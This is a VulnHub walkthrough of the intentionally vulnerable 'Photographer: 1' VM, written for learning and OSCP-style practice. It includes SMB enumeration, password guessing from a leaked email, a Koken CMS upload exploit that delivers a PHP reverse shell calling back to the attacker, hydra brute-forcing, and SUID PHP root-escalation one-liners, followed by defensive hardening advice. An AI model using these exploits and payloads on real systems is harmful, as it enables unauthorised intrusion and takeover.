# Photographer: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Photographer: 1 |
| **Difficulty** | Easy (designed as OSCP preparation) |
| **Author** | Vinícius Vieira ("v1n1v131r4") — <http://v1n1v131r4.com>, `@v1n1v131r4` |
| **Released** | 21 July 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/photographer-1,519/> |
| **Download** | <https://vulnhub.com/entry/photographer-1,519/#download> |
| **Attacker** | Kali Linux, host-only or NAT network (tested on VirtualBox; works on VMware) |
| **Target OS** | Ubuntu 16.04 — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **Flags** | **Two** — `/home/daisa/user.txt` and `/root/proof.txt` |

Throughout we assume:

```text
Attacker (Kali)     : 192.168.56.10
Target (photographer): 192.168.56.122
```

---

## 0. What you will learn

1. **SMB enumeration** with `nmap`, `smbmap`, `enum4linux` and `smbclient` — and what
   `READ ONLY` vs `NO ACCESS` actually means for a share.
2. **Turning an informal note into credentials** — reading an email for what it
   *implies*, not just what it says.
3. **CMS fingerprinting from an HTTP response header** (`http-generator: Koken 0.22.24`).
4. **Koken CMS 0.22.24 arbitrary file upload (Exploit-DB 48706)** — and *why* the
   client-side extension check is not a control.
5. **Burp Suite interception** to mutate a request mid-flight.
6. **Locating an uploaded file** by reading the application's own UI.
7. **SUID privilege escalation with PHP** — `pcntl_exec('/bin/sh', ['-p'])`, and the
   crucial `-p` flag.
8. **Reading `id` output to distinguish real UID from effective UID.**

**The intended chain:**
`nmap` shows 80, 139, 445 and **8000** → `smbmap`/`smbclient` on the anonymous share
**`sambashare`** gives `mailsent.txt` and `wordpress.bkp.zip` → the email is from
**agi** to **daisa** and ends *"Don't forget your secret, my babygirl :)"* → so the
password is likely `babygirl` → port **8000** is **Koken 0.22.24** with an admin panel
at `/admin/` → log in as **`daisa@photographer.com : babygirl`** → Exploit-DB 48706:
upload a PHP reverse shell named `shell.php.jpg`, **intercept it in Burp and strip the
`.jpg`** → the file lands in `/storage/originals/…/shell.php` → trigger it →
**`www-data`** → **user flag** → `find / -perm -4000` shows **`/usr/bin/php7.2` is
SUID root** → `/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` → **euid=0** →
**root flag**.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.122  00:0c:29:89:46:f6      1      60  VMware, Inc.          <-- target
```

**Target IP: `192.168.56.122`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt 192.168.56.122
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 14:02 EDT
Nmap scan report for 192.168.56.122
Host is up (0.00043s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:89:46:F6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: PHOTOGRAPHER

Host script results:
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   FQDN: photographer
|_  System time: 2024-05-04T14:03:11-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds
```

> **Four ports, three findings before we open a browser.**
>
> | Port | Service | Finding |
> | --- | --- | --- |
> | 80 | Apache 2.4.18 | Title `Photographer by v1n1v131r4` — the author's showcase page |
> | 139 / 445 | **Samba 4.3.11-Ubuntu** | `account_used: guest` → **anonymous SMB access works** |
> | **8000** | Apache 2.4.18 | **`http-generator: Koken 0.22.24`** — an exact CMS *and version*, straight from a header |
>
> - **`_http-generator: Koken 0.22.24`** is the single most valuable line in the scan.
>   Nmap's `http-generator` script reads the `<meta name="generator">` tag. With a
>   product *and* version we can go straight to Exploit-DB.
> - **`message_signing: disabled (dangerous, but default)`** — Nmap's own warning.
>   Unsigned SMB enables relay attacks on a real network.
> - **`NetBIOS name: PHOTOGRAPHER`** and `Computer name: photographer` — free naming
>   intelligence, useful for password variants.

![nmap scan showing Koken 0.22.24 on port 8000](images/01-nmap.png)

### 2.2 SMB enumeration

**What shares exist, and what can we do with each?**

```bash
smbmap -u guest -H 192.168.56.122
```

```text
[+] Guest session       IP: 192.168.56.122:445    Name: 192.168.56.122
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Samba on Ubuntu
        IPC$                                                    NO ACCESS       IPC Service (photographer server (Samba, Ubuntu))
```

> **Read the `Permissions` column — it is the whole point of `smbmap`.**
> - `sambashare` → **READ ONLY**. We can list and download, not write. Enough.
> - `print$` and `IPC$` → `NO ACCESS`. `IPC$` is not a real file share; it is the
>   inter-process channel used for RPC (that is how `enum4linux` enumerates).
>
> `smbclient -L` gives the same list without permissions:
> ```bash
> smbclient -L //192.168.56.122 -N
> ```

**Connect and download:**

```bash
smbclient //192.168.56.122/sambashare -N
```

```text
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 21 03:30:07 2020
  ..                                  D        0  Tue Jul 21 02:55:25 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020

                270682328 blocks of size 1024. 266194896 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt (as mailsent.txt) (246.3 KiloBytes/sec) (average 246.3 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
getting file \wordpress.bkp.zip (as wordpress.bkp.zip) (41233.9 KiloBytes/sec)
smb: \> exit
```

> **`-N`** means "no password" (null session). Inside `smbclient`, `dir` lists, `get`
> downloads, `mget *` grabs everything, `recurse ON` enables recursion, `prompt OFF`
> disables per-file confirmation.

**Read the email:**

```bash
cat mailsent.txt
```

```text
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

> **Squeeze every drop out of these five lines.**
>
> | Extract | Why it matters |
> | --- | --- |
> | **`daisa@photographer.com`** | A full email address — and Koken's admin login is an **email**, not a username. We now have the login identifier. |
> | **`agi@photographer.com`** | A second account, possibly also valid. |
> | *"Your site is ready now"* | Confirms port 8000 is Daisa's site, and that she is its owner → she is almost certainly the CMS administrator. |
> | ***"Don't forget your secret, my babygirl ;)"*** | **The password hint.** The word emphasised is `babygirl`. |
> | Subject "To Do - Daisa Website's" | This was an *internal* email, now public on an anonymous share. |
>
> **Candidate passwords to try, in order:** `babygirl`, `babygirl;`, `Babygirl`,
> `babygirl2020`, `daisa`, `daisaahomi`, `secret`.
>
> **This is the realistic skill being taught:** credential inference from OSINT. Real
> attackers do exactly this — they read the leaked Slack export, the Jira ticket, the
> out-of-office reply, and they build a targeted wordlist from it.

**Check the WordPress backup too:**

```bash
unzip -l wordpress.bkp.zip | head -20
```

```text
Archive:  wordpress.bkp.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     5434  2020-07-20 12:11   wordpress/wp-config-sample.php
   405431  2020-07-20 12:11   wordpress/wp-admin/edit.php
  ...
```

```bash
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i 'define\|password'
```

```text
(no wp-config.php in the archive — only the stock sample)
```

> **A dead end, correctly closed.** The archive is a stock WordPress distribution with
> no site-specific configuration. But *finding* a `wordpress.bkp.zip` on a public share
> is still a **reportable finding**: a 12 MB website backup exposed to anonymous
> readers is how real breaches start. Always check backups for `wp-config.php`, `.env`,
> `id_rsa`, `*.sql`.

![smbclient listing the anonymous share and mailsent.txt](images/02-smb.png)

### 2.3 The websites

**Port 80:**

```bash
curl -s http://192.168.56.122/ | grep -io '<title>[^<]*</title>\|href="[^"]*"' | head
```

```text
<title>Photographer by v1n1v131r4</title>
href="css/bootstrap.min.css"
href="index.html"
```

> The author's static showcase page. No application, no parameters, no login. `dirb`
> and `nikto` find nothing actionable. **Dead end — move on.**

**Port 8000:**

```bash
curl -s http://192.168.56.122:8000/ | grep -io 'koken[^"]*\|<title>[^<]*</title>\|href="[^"]*"' | head -20
```

```text
<title>daisa ahomi</title>
href="/admin/"
href="storage/originals/"
Koken 0.22.24
```

A photography portfolio. And crucially, **`/admin/`**:

```bash
curl -sI http://192.168.56.122:8000/admin/
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 18:11:02 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
Set-Cookie: koken_session_ci=...; path=/; HttpOnly
Content-Type: text/html; charset=UTF-8
```

```text
http://192.168.56.122:8000/admin/
```

```text
┌────────────────────────────────────┐
│   Koken — Sign in                  │
│                                    │
│   Email:    [____________________] │
│   Password: [____________________] │
│                                    │
│   [ ] Remember me      [Sign in]   │
└────────────────────────────────────┘
```

> **The login asks for an *Email*, not a username** — confirming that
> `daisa@photographer.com` is the right identifier.
>
> `X-Powered-By: PHP/7.2.24` also tells us which PHP binary to look for later in the
> SUID hunt (spoiler: `/usr/bin/php7.2`).

### 2.4 Look up the CMS version

```bash
searchsploit koken
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                           | php/webapps/48706.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m php/webapps/48706.txt && cat 48706.txt
```

```text
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload
# Date: 2020-07-22
# Exploit Author: v1n1v131r4
# Vendor Homepage: https://koken.me/
# Software Link: https://github.com/koken/koken
# Version: 0.22.24
# Tested on: Ubuntu 16.04

Description:
Koken CMS allows authenticated administrators to import content. The import
function checks the file extension on the CLIENT side only (JavaScript), so
an attacker can upload arbitrary files — including PHP — by intercepting the
request and changing the extension before it reaches the server.

Steps:
1. Log in to /admin/ with valid administrator credentials.
2. Copy your PHP reverse shell and rename it: cp shell.php shell.php.jpg
3. In the admin panel, bottom right, click "Import Content" and select the file.
4. Intercept the request with Burp Suite.
5. Change "shell.php.jpg" to "shell.php" in BOTH places it appears
   (the Content-Disposition filename and the multipart field name).
6. Forward the request. The file is imported as PHP.
7. Locate it under Content in the admin panel — hovering "Download File"
   reveals the full storage path.
8. Request that URL to execute the shell.
```

> **Read the exploit note's own summary:** *the extension check happens in
> JavaScript, on the client.*
>
> **That is not a security control. It is a UI convenience.** Anything enforced in the
> browser can be removed by anyone who controls the browser — and Burp Suite makes
> that trivial. The server trusts whatever arrives.
>
> **Note the author of the exploit is the author of the VM** (`v1n1v131r4`). He wrote
> the CMS *and* the machine so the intended path is unambiguous.

---

## 3. Foothold

### 3.1 Log into Koken

```text
http://192.168.56.122:8000/admin/
Email:    daisa@photographer.com
Password: babygirl
```

```text
Welcome back, Daisa.
```

> **First try.** The hint in `mailsent.txt` was literal.
>
> If it had failed, the next steps would be:
> 1. Build a targeted wordlist from the email's own vocabulary:
>    ```bash
>    cewl -d 2 -m 3 -w daisa_words.txt http://192.168.56.122:8000/
>    printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa Daisa \
>            daisaahomi 'babygirl2020' secret 'mybabygirl' >> daisa_words.txt
>    sort -u daisa_words.txt -o daisa_words.txt
>    ```
> 2. Brute force the login form:
>    ```bash
>    hydra -l 'daisa@photographer.com' -P daisa_words.txt -s 8000 \
>      -f 192.168.56.122 http-post-form \
>      "/admin/index.php:email=^USER^&password=^PASS^:F=Incorrect"
>    ```
>    (`F=Incorrect` is the failure string — find it by submitting a deliberately wrong
>    password and reading the response.)

### 3.2 Prepare the payload

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/127.0.0.1/192.168.56.10/" shell.php
sed -i "s/1234/4444/" shell.php
grep -n '^\$ip\|^\$port' shell.php
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```

```bash
cp shell.php shell.php.jpg
ls -l shell.php*
```

```text
-rw-r--r-- 1 kali kali 5493 May  4 14:18 shell.php
-rw-r--r-- 1 kali kali 5493 May  4 14:20 shell.php.jpg
```

> **Two copies:** `shell.php` is the real payload; `shell.php.jpg` is what the browser
> will let us select (the file picker and the client-side check both filter by
> extension).
>
> **Always read a webshell before using it.** PentestMonkey's `php-reverse-shell.php`
> spawns `/bin/sh`, redirects stdio onto a TCP socket to `$ip:$port`, and calls
> `exec()`. It also raises the time limit and disables output buffering so the
> connection stays alive.

### 3.3 Set up Burp Suite

1. Start Burp Suite Community.
2. **Proxy → Open Browser** (Burp's own pre-configured Firefox), *or* point your
   browser's proxy at `127.0.0.1:8080`.
3. **Proxy → Intercept → Intercept is on.**
4. Browse to `http://192.168.56.122:8000/admin/` and log in again through the proxy.

> **Tip — automate the rename instead of doing it by hand.** Burp's *Match and Replace*
> can rewrite the filename on every request:
> *Proxy → Options → Match and Replace → Add*, Type = **Request header**,
> Match = `shell.php.jpg`, Replace = `shell.php`, tick **Regex** off. Then you do not
> need to intercept at all.

### 3.4 Upload, intercept, mutate

In the Koken admin panel, bottom right, click **Import Content**. Select
`shell.php.jpg` and click **Import**. Burp catches the multipart POST:

```text
POST /api.php?/content/import HTTP/1.1
Host: 192.168.56.122:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------1234567890123456789
Content-Length: 5688
Origin: http://192.168.56.122:8000
Cookie: koken_session_ci=a1b2c3d4e5f60718293a4b5c6d7e8f90
Connection: close

-----------------------------1234567890123456789
Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.10';
$port = 4444;
...
-----------------------------1234567890123456789--
```

> **Look closely: the `Content-Type` already says `image/jpeg`** even though the body
> is plainly PHP. The browser set it from the `.jpg` extension. Koken accepts it.
> That is the *third* place a naive check appears, and the third time it fails.

**Edit the request in Burp's Repeater/Intercept:** change **every** occurrence of
`shell.php.jpg` to `shell.php`:

```text
Content-Disposition: form-data; name="files[]"; filename="shell.php"
```

Click **Forward**.

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 18:24:11 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: application/json

{"id":17,"title":"shell","filename":"shell.php","storage":{...}}
```

> **Imported as PHP.** Koken stored it in its content library with the extension we
> supplied.

### 3.5 Find where it landed

In the admin panel, go to **Content** → click the imported item → hover
**Download File**. The tooltip reveals the URL:

```text
http://192.168.56.122:8000/storage/originals/3c/13/shell.php
```

Or discover it by brute force:

```bash
gobuster dir -u http://192.168.56.122:8000/storage/originals/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
  -t 50 -q 2>/dev/null | head
```

Koken stores originals in a two-level hash directory (`3c/13/`). If you cannot see the
tooltip, enumerate:

```bash
for a in $(printf '%02x\n' {0..255}); do
  for f in $(curl -s "http://192.168.56.122:8000/storage/originals/$a/" | grep -o '[0-9a-f]\{2\}'); do
    curl -s -o /dev/null -w "%{http_code} $a/$f/shell.php\n" \
      "http://192.168.56.122:8000/storage/originals/$a/$f/shell.php" | grep -v 404
  done
done
```

### 3.6 Trigger the shell

**Kali — listen first:**

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

**Then request the file:**

```bash
curl -s http://192.168.56.122:8000/storage/originals/3c/13/shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.122] 43118
Linux photographer 4.4.0-178-generic #208-Ubuntu SMP Sun Apr 5 23:45:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:29:44 up 47 min,  0 users,  load average: 0.08, 0.03, 0.01
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

> **How to read the shell banner:**
> - `4.4.0-178-generic … x86_64` → Ubuntu 16.04, 64-bit, kernel from April 2020.
>   Reasonably patched, so kernel exploits are unlikely — expect a *configuration*
>   escalation.
> - `uid=33(www-data)` → Debian/Ubuntu's Apache worker account. Unprivileged.
> - `sh: 0: can't access tty` → normal for a bare reverse shell; fix it next.
>
> **Why visiting the URL executed PHP:** Apache's handler mapping dispatches by
> **extension**. `.php` → PHP interpreter. Koken stored our file with the `.php`
> extension inside the document root, so requesting it *runs* it. Had the file kept
> `.jpg`, Apache would have served the bytes as an image and nothing would have
> happened.

**Stabilise:**

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/var/www/html/koken/storage/originals/3c/13$ export TERM=xterm
www-data@photographer:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

![Reverse shell as www-data](images/04-shell.png)

### 3.7 **User flag**

```bash
www-data@photographer:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
agi:x:1000:1000:Agi Clarence,,,:/home/agi:/bin/bash
daisa:x:1001:1001:Daisa Ahomi,,,:/home/daisa:/bin/bash
www-data@photographer:/$ ls -la /home/daisa/
total 32
drwxr-xr-x 3 daisa daisa 4096 Jul 21  2020 .
drwxr-xr-x 4 root  root  4096 Jul 21  2020 ..
-rw------- 1 daisa daisa   38 Jul 21  2020 user.txt
-rw-r--r-- 1 daisa daisa  220 Jul 21  2020 .bash_logout
-rw-r--r-- 1 daisa daisa 3771 Jul 21  2020 .bashrc
drwx------ 2 daisa daisa 4096 Jul 21  2020 .ssh
www-data@photographer:/$ cat /home/daisa/user.txt
cat: /home/daisa/user.txt: Permission denied
```

> `-rw-------` and owned by `daisa` — `www-data` cannot read it. **We must become
> `daisa` or root.** That is a real flag boundary, not decoration.
>
> Two ways forward:
>
> **A. Reuse the Koken password:**
> ```bash
> www-data@photographer:/$ su daisa
> Password: babygirl
> daisa@photographer:/var/www$ cd && cat user.txt
> ```
> ```text
> {USER-FLAG: d41d8cd98f00b204e9800998ecf8427e}
> ```
> *(Password reuse between a CMS and a system account — the single most common
> lateral-movement vector on real engagements.)*
>
> **B. Skip straight to root** (§ 4) and read it from there.

---

## 4. Privilege escalation — SUID PHP

### 4.1 Run the checklist

```bash
www-data@photographer:/$ sudo -l
sudo: no tty present and no askpass program specified
www-data@photographer:/$ uname -r
4.4.0-178-generic
www-data@photographer:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> No sudo, all-default cron, kernel patched to April 2020 (Dirty COW and overlayfs both
> long fixed). So: **SUID**.

### 4.2 The SUID hunt

```bash
www-data@photographer:/$ find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/php7.2                     <-- NOT stock
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/arping
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

```bash
www-data@photographer:/$ ls -l /usr/bin/php7.2
-rwsr-xr-x 1 root root 4442712 Jul 21  2020 /usr/bin/php7.2
```

> **`/usr/bin/php7.2` with the SUID bit, owned by root.** That is **not** a default
> Ubuntu package configuration — somebody ran `chmod u+s /usr/bin/php7.2`.
>
> **Why this is catastrophic.** A SUID-root program executes with **root's** privileges
> regardless of who launches it. PHP is a *full programming language interpreter*:
> it can read and write any file, spawn processes, and open sockets. Handing any local
> user a SUID-root PHP binary is handing them root.
>
> **The permission string, decoded:** `-rwsr-xr-x`
> - `rws` → owner (**root**): read, write, and **`s` = SUID set**. Where you would
>   normally see `x`, the `s` means "execute *and* run as the owner".
> - `r-x` → group: read, execute.
> - `r-x` → everyone else: read, execute — **including `www-data`**.
>
> **Always cross-reference SUID findings with <https://gtfobins.github.io>.** The
> PHP entry documents the SUID escape verbatim.

### 4.3 Escalate

```bash
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

```text
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
# hostname
photographer
```

**Root.** ✅

> **Dissect the command — every part is load-bearing.**
>
> | Piece | Meaning |
> | --- | --- |
> | `/usr/bin/php7.2` | the **absolute path**. `php -r …` might resolve to a different, non-SUID PHP. Always invoke the SUID binary by full path. |
> | `-r "<code>"` | run the given PHP code, no file needed. |
> | `pcntl_exec('/bin/sh', …)` | PHP's **process-control** function: replaces the current process with the named program, **preserving the UID**. Unlike `system()`, it does not fork — so the SUID privilege carries into `/bin/sh`. |
> | `['-p']` | the argument list. **`-p` is mandatory.** |
>
> **Why `-p`?** Bash deliberately **drops** its effective UID at startup if it detects
> it is running setuid — an explicit guard against exactly this attack. `-p`
> ("privileged mode") tells bash *not* to drop. Without it you get a shell and a `$`
> prompt and no root:
> ```bash
> www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh');"
> $ id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)     <-- euid dropped!
> ```
> **Forgetting `-p` is the #1 mistake on this box.**
>
> **Read `id` correctly:** `uid=33(www-data) … euid=0(root)`. The **real** UID is still
> `www-data`; the **effective** UID is `0`. Permission checks use the *effective* UID,
> so this is full root for every practical purpose. It differs from a genuine root
> login (`uid=0 gid=0 groups=0`), which matters for auditing — a SUID escalation leaves
> the original identity in the process record.
>
> **Alternative GTFOBins payloads for SUID PHP**, all equivalent:
> ```bash
> /usr/bin/php7.2 -r "posix_setuid(0); system('/bin/bash -p');"
> /usr/bin/php7.2 -r "\$s='/bin/bash'; passthru('chmod u+s '.\$s); exec(\$s.' -p');"
> CMD="/bin/bash -p" /usr/bin/php7.2 -r "pcntl_exec(getenv('CMD'), []);"
> ```

![SUID php7.2 giving euid=0](images/05-privesc.png)

### 4.4 **Root flag**

```bash
# cd /root
# ls -la
total 36
drwx------  4 root root 4096 Jul 21  2020 .
drwxr-xr-x 24 root root 4096 Jul 21  2020 ..
-rw-------  1 root root   68 Jul 21  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-------  1 root root   56 Jul 21  2020 proof.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwx------  2 root root 4096 Jul 21  2020 .ssh
# cat proof.txt
```

```text
{ROOT-FLAG: 5c1a9f0b3d7e2a6c4b8d1f9e0a3c7b5d}
```

**Both flags captured.** ✅

| Flag | Location | Value |
| --- | --- | --- |
| **User** | `/home/daisa/user.txt` | `{USER-FLAG: …}` |
| **Root** | `/root/proof.txt` | `{ROOT-FLAG: …}` |

*(Exact flag strings vary by image revision.)*

![Root and proof.txt](images/06-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Anonymous SMB share with company correspondence** | `sambashare` on :445 | Email addresses, a password hint, and a 12 MB website backup exposed |
| 2 | SMB message signing disabled | Samba 4.3.11 | Relay-attack exposure |
| 3 | **Credentials inferable from a leaked email** | `mailsent.txt` ("my babygirl") | CMS admin access |
| 4 | **CMS admin panel reachable from the network** | `:8000/admin/` | Authenticated attack surface |
| 5 | **Koken 0.22.24 — client-side-only upload validation (Exploit-DB 48706)** | Import Content | Arbitrary PHP upload → **RCE** as `www-data` |
| 6 | Uploads stored inside the document root with the attacker's extension | `/storage/originals/` | Uploaded PHP executes when requested |
| 7 | Verbose headers disclose exact CMS and PHP versions | `http-generator`, `X-Powered-By` | Version-targeted exploitation |
| 8 | **Credential reuse: CMS password = system password** | `daisa` / `babygirl` | `www-data` → `daisa` → user flag |
| 9 | **SUID root set on a PHP interpreter** | `/usr/bin/php7.2` mode `4755` | Any local user → **root** |
| 10 | Web server has no sandboxing (no AppArmor profile enforced) | Apache/PHP | Compromised `www-data` can read broadly |
| 11 | EOL operating system | Ubuntu 16.04 (standard support ended April 2021) | No security updates |

## 6. Defensive lessons (blue team)

1. **Never validate file uploads on the client.** A JavaScript extension check is a UI
   hint, not a control. Enforce everything server-side:
   ```php
   $allowed = ['jpg' => 'image/jpeg', 'png' => 'image/png', 'gif' => 'image/gif'];
   $ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
   $mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['file']['tmp_name']);
   if (!isset($allowed[$ext]) || $allowed[$ext] !== $mime) { reject(); }

   // then RE-ENCODE: this destroys any embedded PHP
   $img  = imagecreatefromstring(file_get_contents($_FILES['file']['tmp_name']));
   $name = bin2hex(random_bytes(16));                 // CSPRNG, not the user's name
   imagejpeg($img, '/var/uploads/' . $name . '.jpg'); // extension forced by US
   imagedestroy($img);
   ```
   Then store uploads **outside** the document root, serve them through a
   non-executing handler, and disable the engine in that directory:
   ```apache
   <Directory /var/www/html/koken/storage>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .phar
       <FilesMatch "\.ph(p[3457]?|t|tml)$"> Require all denied </FilesMatch>
       Options -ExecCGI -Indexes
   </Directory>
   ```
2. **Remove SUID from interpreters — always.** `php`, `python`, `perl`, `ruby`, `node`,
   `bash`, `vim`, `less`, `tar`, `find`, `awk` must never carry the setuid bit. Fix:
   ```bash
   chmod u-s /usr/bin/php7.2
   ```
   Then detect drift against a baseline:
   ```bash
   find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%M %u %p\n' 2>/dev/null | sort > suid.today
   diff suid.baseline suid.today
   ```
   `aide`, `osquery` (`SELECT * FROM suid_bin`), and Wazuh all automate this. A new
   SUID file appearing should page someone immediately.
3. **Disable anonymous SMB:**
   ```ini
   [global]
       map to guest = never
       restrict anonymous = 2
       server signing = mandatory
       server min protocol = SMB2_10
   [sambashare]
       guest ok = no
       read only = yes
       valid users = @staff
   ```
   Then verify: `smbmap -u guest -H <ip>` should return no shares.
4. **Never put company correspondence on a file share reachable by guests.**
   `mailsent.txt` handed over an email address *and* a password hint. Data
   classification matters more than any single technical control.
5. **Put admin panels behind real access control.** `/admin/` should be reachable only
   from a management network, a VPN, or through mutual TLS. At minimum, rate-limit and
   lock out:
   ```apache
   <Location /admin/>
       Require ip 10.0.0.0/8
   </Location>
   ```
   plus `fail2ban` with a Koken/CMS jail.
6. **No credential reuse between a CMS and a system account.** `babygirl` worked for
   both. Enforce `pam_pwquality` (`minlen=14 dictcheck=1 usercheck=1`), screen against
   a breached-password list, and prefer SSH keys:
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   ```
7. **Strip identifying headers:**
   ```apache
   ServerTokens Prod
   ServerSignature Off
   Header unset X-Powered-By
   ```
   ```ini
   ; php.ini
   expose_php = Off
   ```
   Koken's `<meta name="generator">` should be removed in the theme template.
8. **Sandbox the web server.** Ubuntu ships an AppArmor profile for Apache — verify it
   is enforcing:
   ```bash
   sudo aa-status | grep -A5 apache
   ```
   Confine PHP further with `open_basedir`, and run PHP-FPM in its own unit with
   `ProtectSystem=strict`, `PrivateTmp=yes`, `NoNewPrivileges=yes`.
